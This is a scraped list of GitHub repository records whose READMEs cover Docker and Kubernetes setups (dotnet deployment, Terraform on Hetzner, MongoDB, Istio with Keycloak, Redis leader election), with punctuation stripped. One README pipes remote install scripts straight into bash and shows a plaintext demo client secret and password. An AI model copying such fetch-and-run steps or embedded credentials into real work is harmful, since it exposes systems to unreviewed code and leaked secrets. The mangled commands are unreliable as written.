UseHttpsRedirection Run the application and make sure the app running as expected shell cd dotnet app dotnet run Visit http localhost 5000 WeatherForecast using browser there you will get a json response Dockerize the dotnet core application Create a docker image for the dotnet app appliction which we just created Please note in this demo the docker file was put outside the dotnet app directory shell touch Dockerfile dockerfile FROM mcr microsoft com dotnet core sdk 3 1 AS build WORKDIR app copy csproj and restore as distinct layers COPY sln COPY dotnet app csproj dotnet app RUN dotnet restore dotnet app copy everything else and build app COPY dotnet app dotnet app WORKDIR app dotnet app RUN dotnet publish c Release o out FROM mcr microsoft com dotnet core aspnet 3 1 AS runtime WORKDIR app COPY from build app dotnet app out ENTRYPOINT dotnet dotnet app dll Build our docker image with the dockerfile shell docker build t dotnet app Once then image buit check the image shell docker images You will see the image you just built shell REPOSITORY TAG IMAGE ID CREATED SIZE dotnet app latest 26bae748895f 12 minutes ago 208MB Run the docker image and verify it works shell docker run d p 80 80 name myapp dotnet app Verify the docker image is running shell docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 77855df925bf dotnet app dotnet dotnet app d 6 minutes ago Up 6 minutes 0 0 0 0 80 80 tcp myapp Open browser and visit http localhost WeatherForecast Stop the running container shell docker kill 77855df925bf Read more about Docker images for ASP NET Core https docs microsoft com en us aspnet core host and deploy docker building net docker images Best practices for writing Dockerfiles https docs docker com v17 09 engine userguide eng image dockerfilebest practices Setup a local Docker Registry Since we could not derectly deploy a local docker image to kubernetes so we are going to use a local Docker Registry https docs docker com registry ranther then DockerHub or online registry We start our own local Registry by docker Start the registry container it will pull the docker registry on public docker hub https hub docker com registry tab description shell docker run d p 5000 5000 name registry restart always registry 2 We can see the docker rigistry is runing at localhost with port 5000 shell CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 448aa1396778 registry 2 entrypoint sh etc 1 minute ago Up 1 minute 0 0 0 0 5000 5000 tcp registry Tag our docker image with an additional tag local repository address shell docker tag dotnet app localhost 5000 dotnet app Check the images we see that we get an another dotnet app image named localhost 5000 dotnet app shell docker images REPOSITORY TAG IMAGE ID CREATED SIZE dotnet app latest 26bae748895f 25 minutes ago 208MB localhost 5000 dotnet app latest 26bae748895f 25 minutes ago 208MB Push the image to local registry shell docker push localhost 5000 dotnet app Verify the image is pushed shell curl X GET http localhost 5000 v2 dotnet app tags list Optionnal Stop your registry and remove all data Please make sure you finished ALL the demo practices when doing this step shell docker container stop registry docker container rm v registry Read more about Deploy a registry server https docs docker com registry deploying Deply dotnet app to Kubernetes Create a namespace for dotnet app Firstly let s switch to minikube cluster shell display list of contexts kubectl config get contexts CURRENT NAME CLUSTER AUTHINFO NAMESPACE docker desktop docker desktop docker desktop docker for desktop docker desktop docker desktop minikube minikube minikube set the default context kubectl config use context minikube display the current context kubectl config current context We can create a namespace https kubernetes io docs concepts overview working with objects namespaces for our application in Kubernates shell kubectl create namespace netcore View the available namespace shell kubectl get namespace NAME STATUS AGE default Active 24h docker Active 24h kube node lease Active 24h kube public Active 24h kube system Active 24h netcore Active 8s Create kubernetes resource description file Create a kubernetes description yaml file https kubernetes io docs concepts overview working with objects kubernetes objects describing a kubernetes object for our demo application yaml apiVersion extensions v1beta1 kind Deployment metadata name dotnet app namespace netcore labels name dotnet app spec replicas 1 selector matchLabels name dotnet app template metadata labels name dotnet app spec containers name dotnet app image localhost 5000 dotnet app ports containerPort 80 imagePullPolicy Always apiVersion v1 kind Service metadata name dotnet app namespace netcore spec type NodePort ports port 80 targetPort 80 selector name dotnet app Deploy to Kubernetes Deploy the app to local Kubernetes shell kubectl create f deployment yaml n netcore deployment extensions dotnet app created service dotnet app created Optional Note You can permanently save the namespace for all subsequent kubectl commands in that context Then you can omit the trailing n netcore shell kubectl config set context current namespace netcore Now we can verify our deployment bash kubectl get service n netcore NAME TYPE CLUSTER IP EXTERNAL IP PORT S AGE dotnet app NodePort 10 107 195 245 80 32531 TCP 115s The dotnet app is mapping to port 32531 Let s visit by localhost address http localhost 32531 WeatherForecast Destroy the deployments when you don t what them anymore shell kubectl delete f deployment yaml Scaling Resources You can check the running replica pods by shell kubectl get pods NAME READY STATUS RESTARTS AGE dotnet app 766d8687d m5r94 1 1 Running 0 18m At the moment we have only 1 replica We can scaling up the replicaset to 3 by shell kubectl scale replicas 3 deployment dotnet app n netcore Then we can see that we get 2 more running pods shell kubectl get pods n netcore NAME READY STATUS RESTARTS AGE dotnet app 766d8687d m5r94 1 1 Running 0 19m dotnet app 766d8687d 7nk68 1 1 Running 0 7s dotnet app 766d8687d sgw2q 1 1 Running 0 7s Kubernetes doesn t support stop pause of current state of pod and resume when needed However you can still achieve it by having no working deployments which is setting number of replicas to 0 shell kubectl scale replicas 0 deployment dotnet app n netcore kubectl get pods n netcore No resources found in netcore namespace kubectl get deployment n netcore NAME READY UP TO DATE AVAILABLE AGE dotnet app 0 0 0 0 20m Some useful cammands Some use for cammand which can help to dignosise issues shell kubectl get namespace kubectl get service n younamespace kubectl get deployment n younamespace kubectl get pods n yournamespace kubectl describe resource n yournamespace Read more about kubectl commands at Kubectl Cheatsheet https kubernetes io docs reference kubectl cheatsheet,2020-11-23T02:38:38Z,2020-11-29T14:14:06Z,C#,User,1,1,1,1,master,sajeetharan,1,0,0,0,0,0,0
Mountains-and-rivers,k8s-code-analysis,,k8s code analysis kubernetes v1 20 0 alpha 1 100 gd9b576d61ea,2020-09-26T11:21:07Z,2020-11-28T13:47:49Z,Go,User,0,1,0,18,master,Mountains-and-rivers,1,0,0,0,0,0,0
leonsteinhaeuser,terraform-k8s-hcloud,cert-manager#hcloud#hetzner#hetzner-cloud#k8s#k8s-cluster#k8s-deployment#kubernetes#kubernetes-cluster#letsencrypt#nginx-ingress#terraform#terraform-scripts,terraform k8s hcloud This repository provides terraform https www terraform io scripts that installs a kubernetes cluster in the hetzner cloud https www hetzner com cloud Variables CONNECTION RELATED OPTIONS Name Type Default value Description hcloudtoken string Contains the hetzner cloud api token sshpublickey string ssh idrsa pub Defines the path to your ssh public key sshprivatekey string ssh idrsa Defines the path to your ssh private key sshusername string root Defines the username used for ssh connections sshauthorizedkeyfilelocation string Defines the location for the authorizedkeys file to be used to allow other users to access the machines MACHINE DEFINITION OPTIONS Name Type Default value Description hetznermastermachinetype string cx21 Defines the machine type used for kubernetes master machines For such types refer to https www hetzner com cloud hetznerworkermachinetype string cx21 Defines the machine type used for kubernetes worker machines For such types refer to https www hetzner com cloud hetznermastercount int 1 Defines the number of Kubernetes master machines If the number is 1 a load balancer is created automatically and the external address of the load balancer is set as kubernetes api address hetznerworkercount int 3 Defines the number of Kubernetes worker machines hetznermastermachineprefix string k8s master Defines the master machine prefix A trailing is added after the prefix hetznerworkermachineprefix string k8s worker Defines the worker machine prefix A trailing is added after the prefix hetznerdatacenter string fsn1 dc3 Defines the datacenter in which the cluster should run hetznermachineoperationsystem string ubuntu 20 04 Defines the operation system used on your kubernetes nodes master and workers Currently the hetzner cloud only supports the following operation systems ubuntu 20 04 ubuntu 18 04 ubuntu 16 04 debian 10 debian 9 fedora 32 centos 8 centos 7 hetznermachinemasterbackups boolean false Defines if hetzner should create backups for your master machines hetznermachineworkerbackups boolean false Defines if hetzner should create backups for your worker machines hetznermachinenetwork string 192 168 0 0 24 Defines the private network IPv4 range in hetzners cloud environment hetznermachinenetworksubnetrange string 192 168 0 0 24 Defines the subnet range used in hetzners cloud environment HETZNER LOADBALANCER DEFINITION HA MASTER NODES Name Type Default value Description k8sclusternetworkdriverurl string https docs projectcalico org manifests canal yaml Defines the pod network driver url k8snetworkipclustersubnetrange string 10 0 0 0 16 Defines the ipv4 range used for your pods k8snetworkipservicesubnetrange string 10 128 0 0 16 Defines the ipv4 range used as service range k8sclusterinternaldnsname string cluster local Defines the internal cluster DNS range k8sclusterversion string 1 19 3 00 Defines the version of kubernetes included in the package manager that terraform should install On Debian you can run apt cache policy kubeadm to list the available versions k8sexternalkubernetesaddress string k8s example local Defines the external DNS name used for your cluster if master count 1 the address is set to the loadbalancer KUBERNETES CLUSTER DEFINITION OPTIONS Name Type Default value Description hetznerloadbalancername string k8s lb Defines the loadbalancer name hetznerloadbalancertype string lb11 Defines the type used for the loadbalancer Refer to https www hetzner com cloud load balancer hetznerloadbalancerdatacenterlocation string nbg1 Defines the datacenter in which the loadbalancer should run hetznerloadbalancerusepublicnetworkip boolean true Defines if the loadbalancer should use the public ipv4 to addresses it s targets hetznerloadbalanceralgorithm string roundrobin Defines the loadbalancer algorithm type Possible algorith methods are roundrobin and leastconnections NGINX INGRESS OPTIONS Name Type Default value Description k8senablenginxingresscontroller boolean false Defines whether the nginx Ingress Controller should be used in the cluster This option automatically creates a load balancer that accesses the node port on the worker machines Since we do not support the creation of DNS records you have to do this manually k8snginxingressinstallurl string https raw githubusercontent com kubernetes ingress nginx controller v0 40 2 deploy static provider baremetal deploy yaml Defines the installation URL of the nginx Ingress Controller version to be installed k8snginxingressnodeporthttp number 31110 Defines the node port that is used for the nginx http Ingress Controller k8snginxingressnodeporthttps number 31111 Defines the node port that is used for the nginx https Ingress Controller k8snginxingressloadbalancertimeout number 15 Defines the timeout when a health check try will be canceled if there is no response in seconds k8snginxingressloadbalancerinterval number 15 Defines the interval how often the health check will be performed in seconds k8snginxingresscontrollerloadbalancerstatuscodes list string 2 3 Defines the list of status codes that the load balancer accepts to maintain healthy mode CERTMANAGER OPTIONS Name Type Default value Description k8sdeployacmecertmanager boolean false Defines whether the acme cert manager should be used k8sacmeissueremail string Defines the e mail address of the issuer which is used for letsencrypt as target mail for expiring certificates and problems related to your account k8scertmanageracmeinstallationversion string v1 0 4 Defines the version of the acme cert manager which should be installed See https github com jetstack cert manager releases to see the available versions Recommendations Since all scripts were mainly tested with ubuntu 20 04 systems we recommend to use ubuntu 20 04 on your Kubernetes machines Stumbling blocks Since we do not support the creation of DNS entries you have to do this manually When creating the infrastructure you have to make sure that immediately after running terraform you add an entry to your DNS system pointing to the first master node Examples NGINX ingress with acme certificate terraform tfvars ini k8senablenginxingresscontroller true k8sdeployacmecertmanager true k8sacmeissueremail my admin mail example local Ingress deployment yml yaml apiVersion networking k8s io v1 kind Ingress metadata name nginx ingres namespace my namespace annotations kubernetes io ingress class nginx cert manager io cluster issuer letsencrypt prod spec tls hosts my external dns name example local secretName tls certificate prod leon rules host my external dns name example local http paths pathType Prefix path backend service name my application port number 8080,2020-10-04T14:31:07Z,2020-12-09T13:36:51Z,HCL,User,1,1,1,27,master,leonsteinhaeuser,1,0,0,1,4,0,1
slashpai,docker_k8s_training,,Docker and Kubernetes Training docker apps used for training https github com slashpai dockerk8straining tree main dockerapps docker compose https github com slashpai dockerk8straining tree main docker compose,2020-12-02T10:38:52Z,2020-12-10T09:21:01Z,JavaScript,User,1,1,0,5,main,slashpai,1,0,0,0,0,0,0
krol3,docker-k8s-101,,docker k8s 101 Hello world in docker and kubernetes 101,2020-09-13T15:46:30Z,2020-12-19T13:30:27Z,HTML,User,1,1,1,3,master,krol3,1,0,0,0,0,0,0
chunliu,apsnetcore-aad-k8s,,aad apsnetcore k8s A simple sample to demonstrate running an ASP NET Core web app with Azure AD authentication on Kubernetes Prerequisites A Kubernetes cluster that can be used to deploy the demo The Ingress controller is configured on the Kubernetes cluster Helm A client id that is registered in Azure AD Install Clone the code git clone https github com chunliu apsnetcore aad k8s git Create a namespace in k8s kubectl create namespace aspnetcore aad Update the values in src aspnetcore aad charts values yaml or supply them with the Helm command in the next step Install the charts with Helm helm install aspnetcore aad namespace aspnetcore aad src aspnetcore aad charts,2020-09-13T02:12:36Z,2020-09-28T09:14:04Z,C#,User,1,1,0,10,master,chunliu,1,0,0,0,0,0,0
markbest,k8s-study-notes,,k8s study notes k8s md https github com markbest k8s study notes blob main EF BC 88 E4 B8 80 EF BC 89k8s E5 AE 89 E8 A3 85 E3 80 81 E5 88 B6 E4 BD 9C E5 AE 9E E4 BE 8B E9 95 9C E5 83 8F md PodService md https github com markbest k8s study notes blob main EF BC 88 E4 BA 8C EF BC 89Pod E3 80 81Service md RCRSDeployment md https github com markbest k8s study notes blob main EF BC 88 E4 B8 89 EF BC 89RC E3 80 81RS E3 80 81Deployment md,2020-10-14T01:28:01Z,2020-11-07T05:53:38Z,n/a,User,1,1,0,18,main,markbest,1,0,0,0,0,0,0
teseraio,go-k8s-spdy,,Go k8s api Go k8s api is a helper library to interact with the SPDY protocol in Kubernetes This code is based on the official go client library for Kubernetes Usage remoteCommand spdy RemoteCommand URL https pods redis TLSConfig tlsConf args spdy Args Container redis Command string redis cli info out err remoteCommand Execute args if err nil panic err fmt Println string out,2020-10-29T16:04:55Z,2020-10-29T16:16:01Z,Go,Organization,0,1,0,1,main,ferranbt,1,0,0,0,0,0,0
erlong15,mongo_k8s_deploy,,Task 1 Provide a solution code and setup CI CD pipeline that will automatically 1 1 Setup a production like three Node MongoDB Cluster in Kubernetes Assume Kubernetes cluster already in place 1 2 Create a unique mongo collection and a user with write permissions to that collection 1 3 The output should include a collection with user credentials 1 4 Validate deployment 1 5 Expose an endpoint for Prometheus metrics 2 Pick a set of metrics to ensure reliable functionality of the cluster Notes production like is not meant in sense of performance but in sense of maintenance How to run new mongodb sh you can add running this script in your pipeline we suppose we run this script on a runner with an access to k8s cluster and on the runner we have pre installed kubectl and helm Metric to ensure reliable functionality of the cluster bash HELP mongodbup Whether MongoDB is up TYPE mongodbup gauge mongodbup 1 HELP processcpusecondstotal Total user and system CPU time spent in seconds TYPE processcpusecondstotal counter processcpusecondstotal 1 91 HELP processmaxfds Maximum number of open file descriptors TYPE processmaxfds gauge processmaxfds 1 048576e 06 HELP processopenfds Number of open file descriptors TYPE processopenfds gauge processopenfds 11 HELP processresidentmemorybytes Resident memory size in bytes TYPE processresidentmemorybytes gauge processresidentmemorybytes 2 492416e 07 HELP mongodbmongodreplsetmemberhealth This field conveys if the member is up 1 or down 0 TYPE mongodbmongodreplsetmemberhealth gauge mongodbmongodreplsetmemberhealthname otus mongodb 0 otus mongodb headless mongodb svc cluster local 27017 set otustest state PRIMARY 1 mongodbmongodreplsetmemberhealthname otus mongodb 1 otus mongodb headless mongodb svc cluster local 27017 set otustest state SECONDARY 1 mongodbmongodreplsetmemberhealthname otus mongodb 2 otus mongodb headless mongodb svc cluster local 27017 set otustest state SECONDARY 1 HELP mongodbmongodreplsetmemberoperationallag The operationl lag or staleness of the oplog timestamp for this member TYPE mongodbmongodreplsetmemberoperationallag gauge mongodbmongodreplsetmemberoperationallagname otus mongodb 1 otus mongodb headless mongodb svc cluster local 27017 set otustest state SECONDARY 1 mongodbmongodreplsetmemberoperationallagname otus mongodb 2 otus mongodb headless mongodb svc cluster local 27017 set otustest state SECONDARY 1 HELP mongodbmongodreplsetmemberreplicationlag The replication lag that this member has with the primary TYPE mongodbmongodreplsetmemberreplicationlag gauge mongodbmongodreplsetmemberreplicationlagname otus mongodb 1 otus mongodb headless mongodb svc cluster local 27017 set otustest state SECONDARY 0 mongodbmongodreplsetmemberreplicationlagname otus mongodb 2 otus mongodb headless mongodb svc cluster local 27017 set otustest state SECONDARY 0 HELP mongodbmongodreplsetmemberlastheartbeat The lastHeartbeat value provides an ISODate formatted date and time of the transmission time of last heartbeat received from this member TYPE mongodbmongodreplsetmemberlastheartbeat gauge mongodbmongodreplsetmemberlastheartbeatname otus mongodb 0 otus mongodb headless mongodb svc cluster local 27017 set otustest state PRIMARY 1 599730925e 09 mongodbmongodreplsetmemberlastheartbeatname otus mongodb 1 otus mongodb headless mongodb svc cluster local 27017 set otustest state SECONDARY 1 599730925e 09 HELP mongodbmongodreplsetmemberlastheartbeatrecv The lastHeartbeatRecv value provides an ISODate formatted date and time that the last heartbeat was received from this member TYPE mongodbmongodreplsetmemberlastheartbeatrecv gauge mongodbmongodreplsetmemberlastheartbeatrecvname otus mongodb 0 otus mongodb headless mongodb svc cluster local 27017 set otustest state PRIMARY 1 599730925e 09 mongodbmongodreplsetmemberlastheartbeatrecvname otus mongodb 1 otus mongodb headless mongodb svc cluster local 27017 set otustest state SECONDARY 1 599730925e 09 HELP mongodbmongodoplatencieslatencytotal op latencies statistics in microseconds of mongod TYPE mongodbmongodoplatencieslatencytotal gauge mongodbmongodoplatencieslatencytotaltype command 362040 mongodbmongodoplatencieslatencytotaltype read 36615 mongodbmongodoplatencieslatencytotaltype write 0 HELP mongodbmongodoplatenciesopstotal op latencies ops total statistics of mongod TYPE mongodbmongodoplatenciesopstotal gauge mongodbmongodoplatenciesopstotaltype command 1527 mongodbmongodoplatenciesopstotaltype read 292 mongodbmongodoplatenciesopstotaltype write 0 HELP mongodbmongodwiredtigerlogoperationstotal The total number of WiredTiger log operations TYPE mongodbmongodwiredtigerlogoperationstotal counter mongodbmongodwiredtigerlogoperationstotaltype flush 3605 mongodbmongodwiredtigerlogoperationstotaltype read 0 mongodbmongodwiredtigerlogoperationstotaltype scan 4 mongodbmongodwiredtigerlogoperationstotaltype scandouble 3 mongodbmongodwiredtigerlogoperationstotaltype sync 49 mongodbmongodwiredtigerlogoperationstotaltype syncdir 1 HELP mongodbopcountersrepltotal The opcountersRepl data structure similar to the opcounters data structure provides an overview of database replication operations by type and makes it possible to analyze the load on the replica in more granular manner These values only appear when the current host has replication enabled TYPE mongodbopcountersrepltotal counter mongodbopcountersrepltotaltype command 0 mongodbopcountersrepltotaltype delete 0 mongodbopcountersrepltotaltype getmore 0 mongodbopcountersrepltotaltype insert 3 mongodbopcountersrepltotaltype query 0 mongodbopcountersrepltotaltype update 0 HELP mongodbopcounterstotal The opcounters data structure provides an overview of database operations by type and makes it possible to analyze the load on the database in more granular manner These numbers will grow over time and in response to database use Analyze these values over time to track database utilization TYPE mongodbopcounterstotal counter mongodbopcounterstotaltype command 1545 mongodbopcounterstotaltype delete 0 mongodbopcounterstotaltype getmore 0 mongodbopcounterstotaltype insert 0 mongodbopcounterstotaltype query 297 mongodbopcounterstotaltype update 0,2020-09-20T19:42:43Z,2020-09-20T20:02:05Z,Shell,User,1,1,0,0,master,,0,0,0,0,0,0,0
vladimirtiukhtin,terraform-k8s-rabbitmq,,Terraform K8s RabbitMQ Module Terraform module to create following K8S resources StatefulSet Service Secret ConfigMap Ingress optionally Contents Required Input Variables variables Usage usage Outputs outputs Licence licence Author Information author Required Input Variables Module does not require any input variables See full list variables tf of supported variables Usage To provision 3 nodes cluster in default namespace use hcl terraform module rabbitmq source modules k8srabbitmq Multiple deployments are also supported hcl terraform module rabbitmqdev1 source modules k8srabbitmq instance dev1 module rabbitmqdev2 source modules k8srabbitmq instance dev2 To enable rabbitmqmanagement plugin and expose it via cluster ingress controller use hcl terraform module rabbitmq source modules k8srabbitmq additionalplugins rabbitmqmanagement ingresshosts host rabbitmq local domainname path To specify necessary ingress annotations and or any extra labels use hcl terraform module rabbitmq source modules k8srabbitmq additionalplugins rabbitmqmanagement ingressannotations kubernetes io ingress class traefik traefik ingress kubernetes io redirect entry point https traefik ingress kubernetes io redirect permanent true ingresshosts host rabbitmq local domainname path extralabels app kubernetes io part of lower var projectname app kubernetes io environment local environment Outputs Full list of module s outputs and descriptions can be found in outputs tf outputs tf License The module is being distributed under MIT Licence LICENCE txt Please make sure you have read understood and agreed to its terms and conditions Author Information Vladimir Tiukhtin London,2020-11-28T13:45:52Z,2020-12-01T19:17:54Z,HCL,User,1,1,1,2,main,asergisvt,1,0,1,0,0,0,0
Sh4d1,scaleway-k8s-vpc,controller#k8s#kubernetes#private-network#scaleway#vpc,Scaleway K8S VPC Note This in just a Proof of Concept it is not suited for production usage Scaleway K8S VPC is a controller for Kubernetes running on Scaleway leveraging CRDs to use PrivateNetwork in the cluster Getting started Install the controller and the node daemon with yaml kubectl create k https github com Sh4d1 scaleway k8s vpc config default Create and enter your Scaleway credentials with yaml kubectl create f https raw githubusercontent com Sh4d1 scaleway k8s vpc main secret yaml edit namespace scaleway k8s vpc system You can now create the following PrivateNetwork object yaml apiVersion vpc scaleway com v1alpha1 kind PrivateNetwork metadata name my privatenetwork spec id cidr 192 168 0 0 24 routes to 1 2 3 4 16 via 192 168 0 10 This will attach the private network to all nodes in the cluster set up the interfaces with IPs in the range and add the routes if needed Contribution Feel free to submit any issue feature request or pull request smile,2020-12-07T09:27:01Z,2020-12-07T10:47:15Z,Go,User,1,1,0,4,main,Sh4d1,1,0,0,3,0,0,0
jessemillar,k8s-stress-research,chaos-engineering#docker#kubernetes#stress-ng,k8s stress research Yes I m aware there are existing projects that were created to apply stress to Kubernetes clusters but I m working on some internal Microsoft projects that are needed for custom infrastructure As such the research presented by this repository will be largely based around raw stress ng with no non Kubernetes wrappers The way I m looking at it currently there s three options for applying stress using a wrapper around stress ng 1 Use a daemonset to run a container with stress ng that tries to vampire suck all the resources of the node 1 Use a sidecar of sorts to get stress ng inside the application pods and apply stress directly 1 Somehow install stress ng on the actual VM potentially via a daemonset and stress the whole box Setup 1 Install the Kubernetes Metrics Server https github com kubernetes sigs metrics server requirements Tests Performed Local Docker Test 1 Used Docker on my development machine to run a stress ng load test at 80 CPU for a minute docker run it rm alexeiled stress ng latest ubuntu cpu 0 cpu load 80 timeout 60s metrics brief Saw host CPU usage hold at 80 across all cores as expected Local Kubernetes Test 1 Created a local Kubernetes cluster using Kind https github com kubernetes sigs kind 1 Applied a pod spec to the cluster that contains stress ng kubectl apply f pod yaml 1 Triggered the stress ng pod to load test at 80 CPU for a minute kubectl exec it stress ng cpu 0 cpu load 80 timeout 60s Saw host CPU usage hold at 80 across all cores as expected Local Kubernetes Test with Multiple Stressor Pods 1 Created a local Kubernetes cluster using Kind https github com kubernetes sigs kind 1 Applied multiple pod specs to the cluster that contains stress ng kubectl apply f pod yaml kubectl apply f pod2 yaml 1 Triggered the stress ng pods to load test at 80 CPU for a minute kubectl exec it stress ng cpu 0 cpu load 80 timeout 60s kubectl exec it stress ng cpu 0 cpu load 80 timeout 60s Saw host CPU usage hold at 100 across all cores The competing pods were not able to take CPU above 100 usage Questions to Answer Are we trying to chaos test Kubernetes as a service or chaos test a service that runs on Kubernetes Is it possible to guarantee that a daemonset has unlimited resource constraints Do we want a daemonset to have unlimited resource constraints or to respect the cluster resource quote in the event of multitenant situations Do daemonsets get rescheduled to other nodes when resources are consumed Does Kubernetes react differently when the machine is stressed directly vs stressed from inside a container e g Will it reschedule pods in one situation and not in another we want to simulate real load as much as possible How does networking inside a daemonset work How do we make sure the communication cert gets installed inside a daemonset container Would we save time effort by instead wrapping an existing k8s stressing framework like Pumba https github com alexei led pumba Arguments for Containerized Daemonset Would work and be able to more easily respect multitenant resource namespacing Might be simpler to interact with Kubernetes networking from inside the Kubernetes network,2020-10-21T15:43:50Z,2020-10-22T18:28:53Z,n/a,User,1,1,0,9,main,jessemillar,1,0,0,0,0,0,0
rodrigogeromin,lab-k8s-vagrant,,Pr requisitos Esse laboratrio requer Softwares Vagrant 2 2 7 Linux VirtualBox Windows VirtualBox openssh client Git Client Hardware CPU 6 Memria 8GB HD 120GB Obs O Disco flexivel sendo possvel diminuir alterando o Vagrantfile Preparando a infraestrutura 1 Acesse o link abaixo https www vagrantup com downloads html https releases hashicorp com vagrant 2 2 7 2 Faa o download do Vagrant para seu sistema operacional 3 Realize a instala o Debian Based dpkg i RedHat Based rpm ivh Windows Clique no instalador Siga o assistente at o finalizar a instala o Reinicie o computador Download do Centos 7 Para realizar o download da box do Centos 7 execute o comando Linux bash vagrant box add centos 7 vagrant plugin install scp vagrant Windows powershell PS vagrant exe box add centos 7 PS vagrant exe plugin install scp vagrant Obs Selecione o virtualizador virtualbox Aten o Esse laboratrio s funciona com o Virtualbox Criando chaves SSH Execute os comando abaixo Linux ssh keygen f files idrsa Windows powershell PS ssh keygen exe f files idrsa Linux bash vagrant up Windows powershell PS vagrant exe up O Projeto Esse projeto quatro maquinas virtuais controller 172 25 10 10 kubemaster01 172 25 10 20 node01 172 25 10 30 node02 172 5 10 40 O endereo do loadbalance 172 25 10 50 Controller Essa mquina virtual responsvel por instalar e gerenciar o cluster kubernetes Ela possui os seguintes utilitrios Ansible Docker Helm Client Kubectl Docker Registry Ela tambm utilizada como um gerenciador de instala o As configuraes executadas por ela s o Instala o do cluster Kubernetes atravs do kubespray Ansible Instala o de um loadbalance para o k8s Ansible Instala o do ingress controller Helm Instala o de um servio de docker registry Ansible Armazenar imagens dos projetos Docker Registry Kubemaster01 Essa maquina virtual faz o papel de master do cluster kubernetes Ela faz a orquestra o do cluster e armazena o banco de dados etcd Node01 e Node02 Essas s o as mquinas virtuais onde s o executados nossos workloads Fazem o papel de n do cluster Aps a instala o Comandos teis Acessando o controlador vagrant ssh controller Varificando o cluster k8s kubectl get nodes O projeto sobe um servio do nginx com o objetivo de testar se a instala o do cluster foi bem sucedida Para verificar acesse o endereo http nginx 172 25 10 50 nip io Veja as configuraes desse workload kubectl get all kubectl get ingress Abaixo o resultado esperado vagrant controller kubectl get all NAME READY STATUS RESTARTS AGE pod nginx 6799fc88d8 b7r96 1 1 Running 0 5m57s NAME TYPE CLUSTER IP EXTERNAL IP PORT S AGE service kubernetes ClusterIP 10 233 0 1 443 TCP 13m service nginx ClusterIP 10 233 38 25 80 TCP 5m56s NAME READY UP TO DATE AVAILABLE AGE deployment apps nginx 1 1 1 1 5m57s NAME DESIRED CURRENT READY AGE replicaset apps nginx 6799fc88d8 1 1 1 5m57s vagrant controller kubectl get ingress Warning extensions v1beta1 Ingress is deprecated in v1 14 unavailable in v1 22 use networking k8s io v1 Ingress NAME CLASS HOSTS ADDRESS PORTS AGE ingress nginx nginx 172 25 10 50 nip io 172 25 10 50 80 6m7s Se voc chegou at aqui um bom sinal Estamos prontos para utilizar nosso laboratrio,2020-11-13T18:02:53Z,2020-11-27T19:58:18Z,Shell,User,1,1,0,0,master,,0,0,0,0,0,0,0
revl-ca,local-k8s-istio,,Local K8s cluster with Istio Be sure all the pods are perfectly deployed at every steps To do so type kubectl get pods A Dependencies Install k3d curl s https raw githubusercontent com rancher k3d main install sh bash Install istioctl curl L https istio io downloadIstio ISTIOVERSION 1 6 8 TARGETARCH x8664 sh sudo mv istio 1 6 8 bin istioctl usr bin Setup Create the cluster k3d cluster create a 3 no lb k3s server arg no deploy traefik Create the Istio namespace kubectl create namespace istio system Create the Istio manifests istioctl manifest generate kubectl apply f Note Add set values prometheus enabled false to install without Prometheus Create the base Istio resources kubectl apply f base istio yml Deploy Keycloak kubectl apply f keycloak yml Add entries to etc hosts echo 127 0 0 1 keycloak keycloak svc cluster local etc hosts echo 127 0 0 1 svc test app demo one svc cluster local etc hosts echo 127 0 0 1 svc test app demo two svc cluster local etc hosts Open port forwarding kubectl port forward n istio system service istio ingressgateway 8080 80 Provision Keycloak with dummy resources provision sh Deploy first dummy application kubectl apply f demo one yml Testing Istio with Keycloak Open https oidcdebugger com Authorize URI required http keycloak keycloak svc cluster local 8080 auth realms test istio protocol openid connect auth Redirect URI required https oidcdebugger com debug Client ID required test client oidcdebugger Scope required openid Response type required token Press SEND REQUEST Authenticate on Keycloak Username john doe domain com Password john doe domain com Press LOGIN Copy the Access Token export TOKEN Call the service using JWT curl header Authorization Bearer TOKEN http svc test app demo one svc cluster local 8080 demo one Testing Istio with a Keycloak Service Account Deploy second dummy application kubectl apply f demo two yml Get a JWT export TOKEN curl silent request POST http keycloak keycloak svc cluster local 8080 auth realms test istio protocol openid connect token header Content Type application x www form urlencoded data clientid test service account clientsecret cedddd8f e84b 453d b86f 8d571cc99fd1 granttype clientcredentials jq r accesstoken Call the service using JWT curl header Authorization Bearer TOKEN http svc test app demo two svc cluster local 8080 demo two Links Keycloak http keycloak keycloak svc cluster local 8080 auth Demo one http svc test app demo one svc cluster local 8080 demo one Demo two http svc test app demo two svc cluster local 8080 demo two Teardown Remove the cluster k3d cluster delete,2020-11-23T19:23:56Z,2020-12-17T03:20:14Z,Shell,User,1,1,0,5,master,revl-ca,1,0,0,0,0,0,0
WeScale,k8s-advanced-training,,This repository contains resources for the advanced Kubernetes training Content resources folder to publish resources accessible from GitHub,2020-11-20T09:02:46Z,2020-11-30T13:25:37Z,HTML,Organization,5,1,1,25,master,akramWewe#bbenlazreg,2,0,0,0,0,0,2
terorie,redis-k8s-election,kubernetes#redis#sentinel,redis k8s election Kubernetes native leader follower replication for Redis Built with Go and at Blockdaemon About This service implements leader follower master slave replication for Redis It replaces Redis Sentinel using Kubernetes native leader election The list of capabilities is similar to Sentinel s https redis io topics sentinel Monitoring Kubernetes readiness and liveness checks continually check Events Events regarding availability checks are handled with K8s native APIs for example through Alertmanager via kube state metrics https github com kubernetes kube state metrics Automatic failover If a master fails another is re elected redis k8s election has certain advantages over Sentinel Works with any Redis client and does not require explicit failover support nor special configuration No Sentinel quorum required to achieve consensus The Redis service stays up as long as it has access to one Redis pod and the Kubernetes control plane Resilient against pod rescheduling by using Pod DNS Redis Sentinel via the bitnami redis https artifacthub io packages helm bitnami redis Helm chart use Pod IPs which risks running into deadlocks when enough pods reschedule and change IPs Reasons to instead use Redis Sentinel or ledisdb redis failover https github com ledisdb redis failover You prefer Redis Sentinel s maturity You don t have an existing Kubernetes environment You don t want to rely on the Kubernetes control plane for availability k8s io client go tools leaderelection is in alpha state though it has been stable for 2 years does not strictly guarantee that only one Redis instance is leading has higher latency than Sentinel or etcd is prone to clock skew larger than the lease duration For further information please check the Redis Sentinel Documentation https redis io topics sentinel Quickstart The manifests at examples cluster yaml deploy a three node Redis leader replica cluster shell script kubectl create namespace redis k8s election kubectl apply n redis k8s election f https raw githubusercontent com terorie redis k8s election main examples cluster yaml Connect to the leader for read write access shell script kubectl port forward n redis k8s election svc redis leader 6378 6379 redis cli p 6378 info replication Or any of the nodes for read access shell script kubectl port forward n redis k8s election svc redis replica 6379 redis cli p 6379 info replication Election results redis 0 gets created first winning the leader election redis 1 and redis 2 will follow kubectl logs n redis k8s election redis 0 